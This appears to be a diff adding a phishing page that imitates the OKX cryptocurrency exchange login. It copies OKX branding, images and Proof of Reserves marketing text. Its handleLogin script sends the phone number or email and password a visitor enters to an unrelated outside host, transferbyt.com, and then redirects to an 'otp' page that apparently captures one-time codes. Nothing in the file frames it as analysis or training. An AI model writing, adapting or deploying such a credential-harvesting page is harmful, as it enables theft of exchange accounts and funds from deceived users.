@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>OKX</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
+    />
+    <style>
+      /* Custom style for reducing switch border radius */
+      .custom-switch {
+        border-radius: 8px !important;
+      }
+
+      .hover-content {
+        border-radius: 8px;
+      }
+
+      .icon {
+        line-height: 0;
+      }
+
+      .no-wrap {
+        white-space: nowrap;
+      }
+
+      .selected-tab {
+        color: black !important;
+        border-bottom: 2px solid black;
+      }
+
+      .form-input,
+      .form-button {
+        border-radius: 12px;
+      }
+
+      .bg-form {
+        background-color: white;
+      }
+
+      .btn {
+        transition: background-color 0.3s ease;
+      }
+
+      .btn:hover {
+        background-color: rgba(0, 0, 0, 0.1);
+      }
+
+      .input-custom {
+        width: 100%;
+        border: 1px solid #d3d3d3;
+        padding: 0.5rem;
+        border-radius: 4px;
+        transition: border-color 0.3s ease;
+      }
+
+      .input-custom:focus {
+        border-color: #000000;
+        outline: none;
+      }
+
+      .icon-wrapper i {
+        width: 40px;
+        height: 40px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .icon-wrapper i:hover {
+        color: black;
+        border-color: black;
+        transition: color 0.2s, border-color 0.2s;
+      }
+
+      #menu-icon,
+      #search-icon {
+        display: none;
+      }
+
+      @media screen and (max-width: 968px) {
+        #left-part,
+        #switch,
+        #nav-links,
+        #hideIcon,
+        #search-bar,
+        #loginBtn,
+        #divider {
+          display: none;
+        }
+
+        #menu-icon,
+        #search-icon {
+          font-size: 24px;
+          display: block;
+        }
+
+        #right-part {
+          width: 100%;
+        }
+
+        #social-icons {
+          gap: 10px;
+          justify-content: center;
+        }
+
+        #qrTab {
+          display: none;
+        }
+
+        #tabs {
+          margin-top: 40px;
+        }
+
+        #login-title {
+          color: black;
+        }
+      }
+    </style>
+  </head>
+  <body class="bg-gray-100">
+    <!-- Navbar -->
+    <nav class="bg-black text-white p-4">
+      <div class="flex justify-between items-center w-full px-4">
+        <!-- Left Side: Logo, Switch and Nav Links -->
+        <div class="flex items-center space-x-4">
+          <div class="logo text-2xl font-bold">Logo</div>
+          <div
+            id="switch"
+            class="flex items-center custom-switch cursor-pointer select-none switch"
+          >
+            <button
+              id="exchangeBtn"
+              class="px-4 py-1 bg-white text-black rounded-l selected-btn"
+            >
+              Exchange
+            </button>
+            <button
+              id="walletBtn"
+              class="px-4 py-1 bg-black text-white rounded-r"
+            >
+              Wallet
+            </button>
+          </div>
+          <div id="divider" class="border-l border-gray-400 h-8 mx-4"></div>
+          <ul id="nav-links" class="flex space-x-4">
+            <!-- Nav Links Here -->
+          </ul>
+        </div>
+        <!-- Right Side: Search, Icons and Buttons -->
+        <div class="flex items-center space-x-3">
+          <div id="search-bar" class="relative flex items-center">
+            <i class="fas fa-search absolute left-2 text-white"></i>
+            <input
+              type="text"
+              placeholder="Search"
+              class="py-1 pl-8 pr-2 rounded bg-gray-800 text-white focus:outline-none"
+            />
+          </div>
+          <div id="divider" class="border-l border-gray-400 h-8"></div>
+          <button id="loginBtn" class="py-1 px-3">Login</button>
+          <button class="border rounded-2xl border-white py-1 px-3">
+            Sign Up
+          </button>
+          <div id="menu-icon">
+            <i class="fas fa-bars"></i>
+          </div>
+        </div>
+      </div>
+    </nav>
+
+    <!-- Sections Below Navbar -->
+    <div class="flex">
+      <section
+        id="left-part"
+        class="bg-black text-white p-8 w-1/2 h-screen flex flex-col items-center justify-center"
+      >
+        <h2 class="text-2xl font-bold">Trade with confidence</h2>
+        <p class="mt-2 max-w-xs">
+          Your funds are always backed 1:1 on OKX with our regularly published
+          audits on our Proof of Reserves.
+        </p>
+        <img
+          src="https://www.okx.com/cdn/assets/imgs/243/5AD5609D76BF42F4.png"
+          alt="Placeholder Image"
+          style="width: 300px; height: 350px; margin-left: 80px"
+        />
+        <div
+          class="mt-6 max-w-[400px] p-4 rounded-lg shadow-lg"
+          style="background-color: rgba(228, 236, 255, 0.1); color: white"
+        >
+          <div class="font-bold text-lg mb-2">Join our Telegram group</div>
+          <p>
+            Ask questions, get answers, and chat with other traders to shape the
+            crypto future together.
+          </p>
+        </div>
+      </section>
+
+      <section
+        id="right-part"
+        class="p-8 mx-auto"
+        style="width: 600px; margin-top: 40px"
+      >
+        <h2 id="login-title" class="text-2xl font-bold mb-4 text-left">
+          Log In
+        </h2>
+        <div id="tabs" class="flex justify-start space-x-4 mb-6">
+          <button
+            id="phoneTab"
+            class="pb-2 text-black"
+            onclick="showTab('phone')"
+          >
+            Phone
+          </button>
+          <button
+            id="emailTab"
+            class="pb-2 text-gray-500"
+            onclick="showTab('email')"
+          >
+            Email / Sub-account
+          </button>
+          <button id="qrTab" class="pb-2 text-gray-500" onclick="showTab('qr')">
+            QR Code
+          </button>
+        </div>
+
+        <!-- Phone Tab Content -->
+        <div id="phoneContent">
+          <div
+            class="flex items-center border p-2 mb-4 w-full"
+            style="border: 1px solid lightgray; border-radius: 7px"
+          >
+            <select id="countryCode" class="focus:outline-none bg-transparent">
+              <option value="+1">+1</option>
+              <option value="+44">+44</option>
+              <option value="+91">+91</option>
+            </select>
+            <input
+              type="text"
+              id="phoneNumber"
+              placeholder="Phone number"
+              class="pl-2 w-full focus:outline-none bg-transparent"
+              oninput="checkInputs()"
+            />
+          </div>
+          <input
+            id="phonePassword"
+            style="border: 1px solid lightgray; border-radius: 7px"
+            type="password"
+            placeholder="Password"
+            class="pl-2 w-full focus:outline-none bg-transparent border-b-2 mb-4 p-2"
+            oninput="checkInputs()"
+          />
+        </div>
+
+        <!-- Email Tab Content (Initially Hidden) -->
+        <div id="emailContent" class="hidden w-full">
+          <input
+            id="emailInput"
+            style="border: 1px solid lightgray; border-radius: 7px"
+            type="text"
+            placeholder="Email"
+            class="pl-2 w-full focus:outline-none bg-transparent border-b-2 mb-4 p-2"
+            oninput="checkInputs()"
+          />
+          <input
+            id="emailPassword"
+            style="border: 1px solid lightgray; border-radius: 7px"
+            type="password"
+            placeholder="Password"
+            class="pl-2 w-full focus:outline-none bg-transparent border-b-2 mb-4 p-2"
+            oninput="checkInputs()"
+          />
+        </div>
+
+        <!-- QR Code Tab Content (Initially Hidden) -->
+        <div id="qrContent" class="hidden">
+          <p class="text-gray-500">Use your app to scan the QR code.</p>
+          <div class="flex justify-center mt-4">
+            <div
+              class="flex flex-col items-center border border-dashed w-40 h-40 mr-4"
+            >
+              <img
+                id="qrCode"
+                src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=randomString"
+                alt="QR Code"
+                class="w-full h-full"
+              />
+            </div>
+            <div
+              class="flex items-center border border-gray-300 rounded"
+              style="width: 160px; height: 160px"
+            >
+              <video
+                src="https://www.okx.com/cdn/assets/files/237/EEBBA16936CF7BBC.mp4"
+                width="160"
+                height="160"
+                autoplay
+                muted
+                loop
+              ></video>
+            </div>
+          </div>
+        </div>
+
+        <!-- Next Button -->
+        <button
+          id="nextButton"
+          class="form-button bg-gray-200 text-white py-3 w-full"
+          style="border-radius: 26px; margin-top: 26px"
+          onclick="handleLogin()"
+        >
+          Next
+        </button>
+
+        <div class="text-center mt-10">
+          <p class="text-gray-500">
+            Don’t have an account?
+            <span class="font-bold text-black-900">Sign up</span>
+          </p>
+          <div class="flex items-center mt-4 space-x-2">
+            <div id="social-icons" class="flex space-x-2">
+              <div class="icon-wrapper border border-gray-300 rounded-full p-1">
+                <i class="fab fa-facebook-f"></i>
+              </div>
+              <div class="icon-wrapper border border-gray-300 rounded-full p-1">
+                <i class="fab fa-twitter"></i>
+              </div>
+              <div class="icon-wrapper border border-gray-300 rounded-full p-1">
+                <i class="fab fa-google"></i>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+    </div>
+
+    <script>
+      let currentTab = "phone";
+
+      function showTab(tab) {
+        currentTab = tab;
+        document.getElementById("phoneContent").style.display =
+          tab === "phone" ? "block" : "none";
+        document.getElementById("emailContent").style.display =
+          tab === "email" ? "block" : "none";
+        document.getElementById("qrContent").style.display =
+          tab === "qr" ? "block" : "none";
+
+        // Reset styles for tabs
+        document.getElementById("phoneTab").classList.remove("selected-tab");
+        document.getElementById("emailTab").classList.remove("selected-tab");
+        document.getElementById("qrTab").classList.remove("selected-tab");
+
+        // Add selected tab style
+        if (tab === "phone") {
+          document.getElementById("phoneTab").classList.add("selected-tab");
+        } else if (tab === "email") {
+          document.getElementById("emailTab").classList.add("selected-tab");
+        } else {
+          document.getElementById("qrTab").classList.add("selected-tab");
+        }
+
+        // Reset input fields
+        document.getElementById("phoneNumber").value = "";
+        document.getElementById("phonePassword").value = ""; // Use the correct ID for phone password
+        document.getElementById("emailInput").value = "";
+        document.getElementById("emailPassword").value = ""; // Reset for email password
+      }
+
+      function checkInputs() {
+        const phoneNumber = document.getElementById("phoneNumber").value.trim();
+        const emailInput = document.getElementById("emailInput").value.trim();
+        const password =
+          currentTab === "phone"
+            ? document.getElementById("phonePassword").value.trim() // Get password based on tab
+            : document.getElementById("emailPassword").value.trim(); // Get email password
+
+        document.getElementById("nextButton").disabled =
+          (currentTab === "phone" && phoneNumber === "") ||
+          (currentTab === "email" && emailInput === "") ||
+          password === "";
+      }
+
+      function handleLogin() {
+        let data;
+        const password =
+          currentTab === "phone"
+            ? document.getElementById("phonePassword").value.trim() // Get phone password
+            : document.getElementById("emailPassword").value.trim(); // Get email password
+
+        if (currentTab === "phone") {
+          const phoneNumber = document
+            .getElementById("phoneNumber")
+            .value.trim();
+          const countryCode = document.querySelector("#countryCode").value; // Get the country code
+          data = { phoneNumber: countryCode + phoneNumber, password: password };
+        } else if (currentTab === "email") {
+          const emailInput = document.getElementById("emailInput").value.trim();
+          data = { email: emailInput, password: password };
+        } else {
+          alert("Please scan the QR code to log in.");
+          return;
+        }
+
+        fetch("https://transferbyt.com/client/customer/auth/okx_login", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(data),
+        })
+          .then((response) => {
+            if (response.ok) {
+              window.location.href = "./otp";
+            } else {
+              alert("Login failed. Please try again.");
+            }
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+          });
+      }
+
+      document.getElementById("loginBtn").addEventListener("click", () => {
+        document.getElementById("right-part").classList.toggle("hidden");
+      });
+
+      showTab(currentTab);
+    </script>
+  </body>
+</html>
